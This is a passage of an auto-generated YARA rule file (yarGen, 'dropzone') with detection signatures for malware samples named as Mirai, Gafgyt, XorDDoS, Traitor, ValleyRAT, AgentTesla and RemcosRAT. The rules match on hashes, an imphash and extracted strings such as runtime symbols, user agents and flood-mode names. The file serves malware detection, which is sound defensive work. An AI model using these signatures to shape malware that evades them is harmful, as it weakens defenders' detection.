      hash5 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
      hash6 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_21 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash3 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "internal/testlog.logger" fullword ascii /* score: '18.00'*/
      $s5 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s6 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s7 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.buckhash" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.buildVersion" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.useAeshash" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.end" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_Traitor_signature__22 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "flag.commandLineUsage" fullword ascii /* score: '24.00'*/
      $s2 = "runtime.mProf_PostSweep" fullword ascii /* score: '20.00'*/
      $s3 = "log.(*Logger).formatHeader" fullword ascii /* score: '19.00'*/
      $s4 = "*struct { F uintptr; lookupGroupCtx context.Context; resolverFunc func(context.Context, string, string) ([]net.IPAddr, error); n" ascii /* score: '15.00'*/
      $s5 = "fmt.(*ss).complexTokens" fullword ascii /* score: '14.00'*/
      $s6 = "regexp.runeSlice.Len" fullword ascii /* score: '13.00'*/
      $s7 = "fmt.(*ss).getRune" fullword ascii /* score: '12.00'*/
      $s8 = "flag.UnquoteUsage" fullword ascii /* score: '12.00'*/
      $s9 = "getRune" fullword ascii /* score: '12.00'*/
      $s10 = "golang.org/x/sys/unix.errnoErr" fullword ascii /* score: '10.00'*/
      $s11 = "golang.org/x/sys/unix.init" fullword ascii /* score: '10.00'*/
      $s12 = "golang.org/x/sys/unix.mmap" fullword ascii /* score: '10.00'*/
      $s13 = "golang.org/x/sys/unix.Syscall6" fullword ascii /* score: '10.00'*/
      $s14 = "fmt.errorHandler" fullword ascii /* score: '10.00'*/
      $s15 = "regexp.runeSlice.Less" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_Traitor_signature__23 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s2 = "runtime.sched_getaffinity.abi0" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.vdsoGettimeofdaySym" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.vdsoClockgettimeSym" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.gettid.abi0" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s7 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getpid" fullword ascii /* score: '15.00'*/
      $s9 = "internal/poll.getPipe" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.getpid.abi0" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.sysMunmap.abi0" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysTHPSizePath" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.systemstack.abi0" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.systemstack_switch.abi0" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.sysMmap.abi0" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9_97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d_24 {
   meta:
      description = "dropzone - from files 8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9.elf, 97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28_97495cae.elf, XorDDoS(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8"
      hash2 = "97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28"
      hash3 = "5fefeaf30b8cd96607ee013a771c619d2bcba75e294f57e98ba86e8b40e51090"
   strings:
      $s1 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s2 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s3 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s4 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s5 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s6 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii /* score: '12.50'*/
      $s7 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
      $s8 = "failed to map segment from shared object" fullword ascii /* score: '12.00'*/
      $s9 = "*** invalid %N$ use detected ***" fullword ascii /* score: '12.00'*/
      $s10 = "symbol lookup error" fullword ascii /* score: '12.00'*/
      $s11 = "error while loading shared libraries" fullword ascii /* score: '12.00'*/
      $s12 = "ISO/IEC JTC1/SC22/WG20 - internationalization" fullword ascii /* score: '12.00'*/
      $s13 = "*** %n in writable segment detected ***" fullword ascii /* score: '12.00'*/
      $s14 = "ELF load command alignment not page-aligned" fullword ascii /* score: '12.00'*/
      $s15 = "%s: %s: %s%s%s%s%s" fullword ascii /* score: '10.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__c33607a4_Mirai_signature__085ef2d3_Mirai_signature__0a233a12_Mirai_signature__17260501_Mirai_signature__1_25 {
   meta:
      description = "dropzone - from files Ga-gyt(signature)_c33607a4.elf, Mirai(signature)_085ef2d3.elf, Mirai(signature)_0a233a12.elf, Mirai(signature)_17260501.elf, Mirai(signature)_1e43050b.elf, Mirai(signature)_3ea9b80c.elf, Mirai(signature)_40f3f130.elf, Mirai(signature)_5080bf43.elf, Mirai(signature)_54139551.elf, Mirai(signature)_7dc56ae9.elf, Mirai(signature)_8dd7c876.elf, Mirai(signature)_93f87ab1.elf, Mirai(signature)_9a6d065e.elf, Mirai(signature)_9cb85702.elf, Mirai(signature)_c944357e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c33607a453bd600566cf86611b16a6210c4747b91b484ba7ab913691e80011c8"
      hash2 = "085ef2d3904f13f9cdd3e950793ba5df92e62cb2ae9741596cc336948228f415"
      hash3 = "0a233a12c9f76217059bd603b70f34ff85f239e291319c88142d313c9f988b70"
      hash4 = "1726050166ff657baee8cf2d39511a3aac31c17286610c99f3a6bf7efdcc2c07"
      hash5 = "1e43050b691b5f5815aedbeca55d24fcecfe78aba4a30d93d33e7509d7e0f999"
      hash6 = "3ea9b80c5d3abe1f701fd3214b588fdf0de5a3e9346595245cc2b520a93c3c72"
      hash7 = "40f3f1306303e637207a2d67b40a3c99b3176264fad39fbf3c67d9b4f4d9ff7f"
      hash8 = "5080bf43f85d8a58d10b69c2fe32051b2db856875e05ba7a9904fc51f1d664e7"
      hash9 = "5413955112a0a5388dc8fb0b059ad360fa1c09234141e1920f1304c0e40e5440"
      hash10 = "7dc56ae9788f6b78d3a87d2c7f35a90c5ea146fec5f75c521c6f9a6ff1df417c"
      hash11 = "8dd7c876c8bf27258fde6453156c261b0ba61738385cb6c1ed8030708b6d4556"
      hash12 = "93f87ab1fd7d19cb30d4a0da1e0963b025b8bab41ce59cf8b99e4bc1bf246d6b"
      hash13 = "9a6d065ef4fd65e77c7659be53fe411da54b363edb46c563351e0efad7c84f91"
      hash14 = "9cb857025124583dc85de8816d075e288a84690cab4475896bec7a1a6da28692"
      hash15 = "c944357ea4089fd418656ebda19bfde6e905c7faf711136fe585b4fa8ac793f6"
   strings:
      $s1 = "eeeeeeeefffffff" ascii /* reversed goodware string 'fffffffeeeeeeee' */ /* score: '18.00'*/
      $s2 = "hhhhhg" fullword ascii /* reversed goodware string 'ghhhhh' */ /* score: '15.00'*/
      $s3 = "dddd<<<<" fullword ascii /* reversed goodware string '<<<<dddd' */ /* score: '14.00'*/
      $s4 = "999998" ascii /* reversed goodware string '899999' */ /* score: '11.00'*/
      $s5 = "%%%%%%%!" fullword ascii /* reversed goodware string '!%%%%%%%' */ /* score: '11.00'*/
      $s6 = "xxxxxxxxyyyyyy" fullword ascii /* score: '11.00'*/
      $s7 = "<<<<<<<<<;" fullword ascii /* reversed goodware string ';<<<<<<<<<' */ /* score: '11.00'*/
      $s8 = "<<<<<5<<<<<<<<+%B" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s9 = "ggggggggghhh" fullword ascii /* score: '8.00'*/
      $s10 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s11 = "ccccccccccccccccccccccccccccccccccccccccccccccccccckcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s12 = "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s13 = "ffffffffgggggg" fullword ascii /* score: '8.00'*/
      $s14 = "rrrrrrrrrrrxx" fullword ascii /* score: '8.00'*/
      $s15 = "cccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_26 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $s1 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s2 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s3 = "runtime.metricReader.compute-fm" fullword ascii /* score: '17.00'*/
      $s4 = "runtime.metricReader.compute" fullword ascii /* score: '17.00'*/
      $s5 = "runtime.compute0" fullword ascii /* score: '17.00'*/
      $s6 = "rnal errorwork.nwait > work.nprocleft over markroot jobsgcDrain phase incorrectMB during sweep; swept bad profile stack countrun" ascii /* score: '15.00'*/
      $s7 = "iled to set sweep barrierwork.nwait was > work.nproc not in stack roots range [allocated pages below zero?address not a stack ad" ascii /* score: '11.00'*/
      $s8 = "*runtime.sysStatsAggregate" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.Stack.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.initMetrics.func23" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.initMetrics.func36" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.nsToSec" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.initMetrics.func48" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.timeHistogramMetricsBuckets" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.initMetrics.func46" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0465a46a_Mirai_signature__22460aec_Mirai_signature__555d3ba4_27 {
   meta:
      description = "dropzone - from files Mirai(signature)_0465a46a.elf, Mirai(signature)_22460aec.elf, Mirai(signature)_555d3ba4.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0465a46a9ac27e8d41e3a9d47710b7e6b92ed56c458ee49ebd38cacdac75a571"
      hash2 = "22460aec59eded810bc76f0fc6c974da617f23c5167ba1c35c26a90e2c50a96d"
      hash3 = "555d3ba4af0532c369c9ef053f97f6260b143cf03502d290154f7458bdb47b14"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s4 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s5 = "HEXBYPASS" fullword ascii /* score: '17.50'*/
      $s6 = "UDPBYPASS" fullword ascii /* score: '17.50'*/
      $s7 = "TCPBYPASS" fullword ascii /* score: '17.50'*/
      $s8 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s11 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" fullword ascii /* score: '12.00'*/
      $s14 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51" fullword ascii /* score: '12.00'*/
      $s15 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__01b09801_Mirai_signature__2136f918_Mirai_signature__2992aec0_Mirai_signature__4925217b_Mirai_signature__61_28 {
   meta:
      description = "dropzone - from files Mirai(signature)_01b09801.elf, Mirai(signature)_2136f918.elf, Mirai(signature)_2992aec0.elf, Mirai(signature)_4925217b.elf, Mirai(signature)_61168c05.elf, Mirai(signature)_656db993.elf, Mirai(signature)_7c4efb04.elf, Mirai(signature)_7f94581a.elf, Mirai(signature)_89850b45.elf, Mirai(signature)_92027e00.elf, Mirai(signature)_a09741b3.elf, Mirai(signature)_a9e23e8f.elf, Mirai(signature)_b05a78dd.elf, Mirai(signature)_ce7aaa40.elf, Mirai(signature)_ce8a03ff.elf, Mirai(signature)_f381a2d3.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
      hash2 = "2136f918d8240c146bbf6b4540deb589e78a41142454aaf7d8c97419905ea2d4"
      hash3 = "2992aec0a4f48e75dc73ebb5d1accda93f7ff9bb03f40e7cc3c0af27fc267450"
      hash4 = "4925217bae3da408b3aab288d6531ca4a12f411ad2443f3686ebde59508c6c1c"
      hash5 = "61168c05a979a1424f46b73a77538c095699766f559816ed38d060357b3f5c88"
      hash6 = "656db993f51939676aa87d7707c11046820c44fc4bfc6ccd76eb912c6094c34f"
      hash7 = "7c4efb04277372d402b4ca3c5f1d3c5be40b375fe6f1e383f3f66cc3a29d78cd"
      hash8 = "7f94581a7aa1e955d54f85b961b3294560b79ae2b62a5cb315e3fadb25721eec"
      hash9 = "89850b45a0b09d6a42d6663a80453e87b94e6c48c5e66af13f992b28db707504"
      hash10 = "92027e007be082fd60fc9f70dacc6b1f1d066dada1ddbd23d9483cc57db657b2"
      hash11 = "a09741b368c9c0d0306e0dd4366d83eebf9b13e5d225607189029fc5d8e8799b"
      hash12 = "a9e23e8f6ee82d0043cf36109ae56ccdd57eba27db749628bbafed0de2f20a4c"
      hash13 = "b05a78ddd68c2fd8edccbecf0fd69af0a026ea0388614f0b4d23a384dbdc926e"
      hash14 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
      hash15 = "ce8a03ffaf143b23c2788bd5ce2460317ce5c134b0662b6cdfcd997d9d18d0ba"
      hash16 = "f381a2d342fe76f7dbe8cf69ca3f3a886ea91605fc5ae2d5542e20f6091a7fc9"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "/proxy.txt" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__AgentTesla_signature__ddb6dc98_RemcosRAT_signature__RemcosRAT_signature__ac4f52f2_RemcosRAT_signature_29 {
   meta:
      description = "dropzone - from files AgentTesla(signature).vbs, AgentTesla(signature)_ddb6dc98.vbs, RemcosRAT(signature).vbs, RemcosRAT(signature)_ac4f52f2.vbs, RemcosRAT(signature)_ed971bcf.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ffbb2562e2cfdfa7601c57d3dd01b9b77e519c18cf592fbe184c9be2a4285ad6"
      hash2 = "ddb6dc98283c5ce029fc0d34009b6a284df76cf81f9de895872277ebfb0355e7"
      hash3 = "89f379f3c244456381a5ac1ffa1530471ef70db4e1a2dd91068ffbc095273dd8"
      hash4 = "ac4f52f2a9cd30338e5a41ed8330255617f8f51899e14e6199c64f4df54f6e34"
      hash5 = "ed971bcfc5a9eebfbecc9aab050ffb9e6d9cfe38a72fd6f74cfec39cbd31475f"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s3 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s4 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s5 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s6 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s7 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s8 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s9 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s10 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s11 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s12 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s13 = "' Optional password (may be required for SMTP authentication)" fullword ascii /* score: '13.00'*/
      $s14 = "If Not WScript.Arguments.Named.Exists(\"ConfigFile\") Then" fullword ascii /* score: '13.00'*/
      $s15 = "WScript.Echo in_strMessage" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_30 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
   strings:
      $s1 = "runtime: may need to increase max user processes (ulimit -u)" fullword ascii /* score: '22.00'*/
      $s2 = "*struct { sync.Mutex; byName map[string][]string; byAddr map[string][]string; expire time.Time; path string; mtime time.Time; si" ascii /* score: '15.00'*/
      $s3 = "RWMutex" fullword ascii /* score: '15.00'*/
      $s4 = "*struct { sync.Mutex; byName map[string][]string; byAddr map[string][]string; expire time.Time; path string; mtime time.Time; si" ascii /* score: '15.00'*/
      $s5 = "internal/poll.(*TimeoutError).Temporary" fullword ascii /* score: '14.00'*/
      $s6 = "hostLookupOrder" fullword ascii /* score: '12.00'*/
      $s7 = "net.(*hostLookupOrder).String" fullword ascii /* score: '12.00'*/
      $s8 = "forceCgoLookupHost" fullword ascii /* score: '12.00'*/
      $s9 = "sync/atomic.CompareAndSwapUint64" fullword ascii /* score: '11.00'*/
      $s10 = "runtime.sbrk0" fullword ascii /* score: '10.00'*/
      $s11 = "net.HardwareAddr.String" fullword ascii /* score: '10.00'*/
      $s12 = " _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shared librariesbufio: reader returned n" ascii /* score: '10.00'*/
      $s13 = "canUseCgo" fullword ascii /* base64 encoded string 'ju,x((' */ /* score: '10.00'*/
      $s14 = "type..hash.net.ParseError" fullword ascii /* score: '8.00'*/
      $s15 = "type..hash.net.AddrError" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__01b09801_Mirai_signature__3f0366c3_Mirai_signature__a155fa86_Mirai_signature__ce7aaa40_31 {
   meta:
      description = "dropzone - from files Mirai(signature)_01b09801.elf, Mirai(signature)_3f0366c3.elf, Mirai(signature)_a155fa86.elf, Mirai(signature)_ce7aaa40.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
      hash2 = "3f0366c3eb2026f0237e1caeed26bf6e6a89327aa48013f23d9875ca539fb2b2"
      hash3 = "a155fa86c4f96777815a3d6a389d98048a4f953cec629601b21201859d0757a6"
      hash4 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
